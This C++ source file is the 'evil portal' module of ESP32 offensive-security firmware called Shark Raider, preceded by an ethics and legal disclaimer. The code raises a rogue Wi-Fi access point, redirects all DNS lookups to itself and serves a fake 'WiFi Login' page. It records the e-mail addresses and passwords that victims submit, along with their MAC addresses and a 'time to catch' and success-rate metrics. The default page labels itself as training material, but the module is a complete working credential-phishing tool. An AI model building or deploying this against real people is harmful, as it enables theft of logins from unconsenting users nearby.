/* Shark Raider: Purpose, Ethics, and Disclaimer

The Shark Raider is an offensive security firmware developed exclusively for the ESP32 
ecosystem, built upon the pillars of ethics, technical expertise, and cyber defense. 
This project is not a tool for illicit activities; it is an instrument for professional 
empowerment and security maturity.

1. Intended Use and Objectives

The development of Shark Raider aims to bridge knowledge gaps and strengthen 
technological infrastructure through:

• Education and Pedagogy: Serving as practical study material for wireless communication
 protocols and hardware vulnerabilities.
• Lectures and Workshops: Demonstrating attack vectors in real-time to raise public 
awareness about the importance of information security.
• Blue Team Training: Enabling defensive teams to identify, monitor, and mitigate 
attacks originating from low-cost hardware.
• Pentesting (Penetration Testing): Providing a versatile tool for security professionals
during authorized audits.
• Academic Research: Encouraging the discovery of new vulnerabilities and the 
development of countermeasures within research environments.

2. Strict Requirement for Controlled Environments

The use of Shark Raider is restricted to controlled and authorized environments. Any 
practical application must occur within private laboratories, personal networks, or 
under the formal, written consent of the infrastructure owner.

3. Legal Boundaries and Jurisdictions
Users must be aware that the misuse of this firmware may violate fundamental laws across
various regions, including but not limited to:

• United States: Violation of the CFAA (Computer Fraud and Abuse Act), which carries 
severe penalties for unauthorized access to computer systems, and FCC regulations regarding radio frequency interference.
• European Union & Portugal: Infringement of the General Data Protection Regulation 
(GDPR) and the Cybercrime Law (Law 109/2009 in Portugal), which protect system integrity 
and citizen data privacy.

--------------------------
EUA: CFAA (18 U.S.C.§ 1030)
UE: Directive 2013/40/UE
BRA: Law 12.737/2012
PRT: Law 109/2009

*/

#include "evil_portal.h"
#include <esp_wifi.h>

// Default HTML template stored in PROGMEM
const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .logo p {
            color: #888;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }
        .error {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔒 WiFi Login</h1>
            <p>This is a fake page for cybersecurity training</p>
        </div>
        <div id="error" class="error"></div>
        <form action="/post" method="POST" id="loginForm">
            <div class="form-group">
                <label for="ssid">E-mail address</label>
                <input type="text" id="ssid" name="ssid" placeholder="Enter e-mail address" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        <div class="footer">
            <p>Educational purpose, do not provide real data</p>
        </div>
    </div>
</body>
</html>
)rawliteral";

// Global instance
EvilPortalManager evilPortal;

// Constructor
EvilPortalManager::EvilPortalManager() 
    : webServer(nullptr), dnsServer(nullptr), active(false), startTime(0), totalCaptured(0), 
      totalTTC(0), ttcCount(0), totalTTR(0), ttrCount(0), totalTTL(0), ttlCount(0) {
}

// Destructor
EvilPortalManager::~EvilPortalManager() {
    end();
}

// Initialize Evil Portal
bool EvilPortalManager::begin(const char* ssid, uint8_t channel) {
    DEBUG_PRINTLN("[Portal] Initializing Evil Portal...");
    
    apName = String(ssid);
    apChannel = channel;
    
    // Reset metrics
    uniqueMacs.clear();
    clientMetrics.clear();
    totalCaptured = 0;
    totalTTC = 0; ttcCount = 0;
    totalTTR = 0; ttrCount = 0;
    totalTTL = 0; ttlCount = 0;
    capturedCreds.clear();
    lastCred = "";
    startTime = millis();
    
    // Create server instances
    webServer = new AsyncWebServer(WEB_SERVER_PORT);
    dnsServer = new DNSServer();
    
    // Load HTML
    htmlPage = String(PORTAL_HTML);
    
    // Start AP
    startAP();
    
    // Setup DNS
    setupDNS();
    
    // Setup web routes
    setupRoutes();
    
    // Start servers
    webServer->begin();
    dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    
    active = true;
    
    DEBUG_PRINTLN("[Portal] Evil Portal started");
    return true;
}

// Stop Evil Portal
void EvilPortalManager::end() {
    if (!active) return;
    
    DEBUG_PRINTLN("[Portal] Stopping Evil Portal...");
    
    if (webServer) {
        webServer->end();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    stopAP();
    active = false;
    
    DEBUG_PRINTLN("[Portal] Evil Portal stopped");
}

// Start Access Point
void EvilPortalManager::startAP() {
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(apName.c_str(), PORTAL_PASSWORD, apChannel, false, PORTAL_MAX_CONNECTIONS);
    
    // Configure IP
    IPAddress local_ip(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    
    delay(100);
}

// Stop Access Point
void EvilPortalManager::stopAP() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
}

// Setup DNS for captive portal
void EvilPortalManager::setupDNS() {
    // DNS is handled in loop() via dnsServer->processNextRequest()
}

// Setup web server routes
void EvilPortalManager::setupRoutes() {
    webServer->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        handleRoot(request);
    });
    
    webServer->on("/post", HTTP_POST, [this](AsyncWebServerRequest* request) {
        handlePost(request);
    });
    
    webServer->onNotFound([this](AsyncWebServerRequest* request) {
        handleNotFound(request);
    });
}

// Handle root request
void EvilPortalManager::handleRoot(AsyncWebServerRequest* request) {
    String clientIP = request->client()->remoteIP().toString();
    
    // Se é um novo cliente ou um que voltou
    if (clientMetrics.find(clientIP) == clientMetrics.end()) {
        clientMetrics[clientIP] = { (uint32_t)millis(), 0, (uint32_t)millis(), false, false };
    } else {
        clientMetrics[clientIP].lastActive = millis();
        clientMetrics[clientIP].disconnected = false; // Reset if they come back
    }
    
    request->send(200, "text/html", htmlPage);
}

// Handle POST request (credentials)
void EvilPortalManager::handlePost(AsyncWebServerRequest* request) {
    String ssid = "";
    String password = "";
    
    if (request->hasParam("ssid", true)) {
        ssid = request->getParam("ssid", true)->value();
    }
    if (request->hasParam("password", true)) {
        password = request->getParam("password", true)->value();
    }
    
    if (ssid.length() > 0 && password.length() > 0) {
        String cred = "User: " + ssid + " | Pass: " + password;
        capturedCreds.push_back(cred);
        lastCred = cred;
        totalCaptured++;
        
        // Calcular TTC para o cliente atual
        String clientIP = request->client()->remoteIP().toString();
        if (clientMetrics.count(clientIP) && !clientMetrics[clientIP].captured) {
            clientMetrics[clientIP].captured = true;
            clientMetrics[clientIP].capturedAt = millis();
            clientMetrics[clientIP].lastActive = millis();
            uint32_t ttc = (clientMetrics[clientIP].capturedAt - clientMetrics[clientIP].firstSeen) / 1000;
            totalTTC += ttc;
            ttcCount++;
        }
        
        DEBUG_PRINTLN("[Portal] Credentials captured");
    }
    
    request->send(200, "text/html", getSuccessHTML());
}

// Handle not found (redirect to root)
void EvilPortalManager::handleNotFound(AsyncWebServerRequest* request) {
    request->redirect("/");
}

String EvilPortalManager::getSuccessHTML() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
        }
        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #11998e;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
        p { color: #666; font-size: 16px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✓</div>
        <h1>Successfully Connected!</h1>
        <p>You are now connected to the network.</p>
    </div>
</body>
</html>
)rawliteral";
}

// Loop function
void EvilPortalManager::loop() {
    if (!active) return;
    dnsServer->processNextRequest();
    
    // Atualizar métricas de clientes conectados
    static uint32_t lastMetricUpdate = 0;
    if (millis() - lastMetricUpdate > 2000) {
        updateClientMetrics();
        lastMetricUpdate = millis();
    }
}

void EvilPortalManager::updateClientMetrics() {
    wifi_sta_list_t stationList;
    if (esp_wifi_ap_get_sta_list(&stationList) == ESP_OK) {
        for (int i = 0; i < stationList.num; i++) {
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", 
                     stationList.sta[i].mac[0], stationList.sta[i].mac[1],
                     stationList.sta[i].mac[2], stationList.sta[i].mac[3],
                     stationList.sta[i].mac[4], stationList.sta[i].mac[5]);
            
            String mac(macStr);
            if (uniqueMacs.find(mac) == uniqueMacs.end()) {
                uniqueMacs.insert(mac);
            }
        }
    }
    
    // Lógica para TTR e TTL baseada em inatividade
    uint32_t now = millis();
    for (auto& pair : clientMetrics) {
        ClientStats& stats = pair.second;
        
        // Se o cliente não é visto há mais de 30 segundos, consideramos que saiu
        if (!stats.disconnected && (now - stats.lastActive > 30000)) {
            stats.disconnected = true;
            
            // Se saiu sem capturar nada, é um Reject (TTR)
            if (!stats.captured) {
                totalTTR += (now - stats.firstSeen); // ms
                ttrCount++;
            }
            
            // TTL: Tempo total de permanência
            totalTTL += (now - stats.firstSeen) / 1000; // s
            ttlCount++;
        }
    }
}

// Getters para Métricas
int EvilPortalManager::getCapturedCredsCount() { return totalCaptured; }
String EvilPortalManager::getLastCredential() { return lastCred; }
void EvilPortalManager::clearCredentials() {
    capturedCreds.clear();
    lastCred = "";
    totalCaptured = 0;
    uniqueMacs.clear();
    clientMetrics.clear();
    totalTTC = 0; ttcCount = 0;
    totalTTR = 0; ttrCount = 0;
    totalTTL = 0; ttlCount = 0;
    startTime = millis();
}
bool EvilPortalManager::isActive() { return active; }
int EvilPortalManager::getClientCount() { return WiFi.softAPgetStationNum(); }
int EvilPortalManager::getTotalUniqueCount() { return uniqueMacs.size(); }

float EvilPortalManager::getSuccessRate() {
    int tot = getTotalUniqueCount();
    if (tot == 0) return 0.0f;
    return ((float)totalCaptured / (float)tot) * 100.0f;
}

uint32_t EvilPortalManager::getUptimeSeconds() {
    if (!active) return 0;
    return (millis() - startTime) / 1000;
}

float EvilPortalManager::getAvgTimeToCatch() {
    if (ttcCount == 0) return 0.0f;
    return (float)totalTTC / (float)ttcCount;
}

float EvilPortalManager::getAvgTimeToReject() {
    if (ttrCount == 0) return 0.0f;
    return (float)totalTTR / (float)ttrCount / 1000.0f; // s
}

float EvilPortalManager::getAvgTimeToLeft() {
    if (ttlCount == 0) return 0.0f;
    return (float)totalTTL / (float)ttlCount;
}

float EvilPortalManager::getMemoryUsagePct() {
    uint32_t free = esp_get_free_heap_size();
    uint32_t total = 320000; // ESP32 RAM aproximada disponível para heap
    float used = (float)(total - free) / (float)total * 100.0f;
    if (used < 0) used = 0;
    if (used > 100) used = 100;
    return used;
}

int8_t EvilPortalManager::getRSSI() {
    return -30;
}
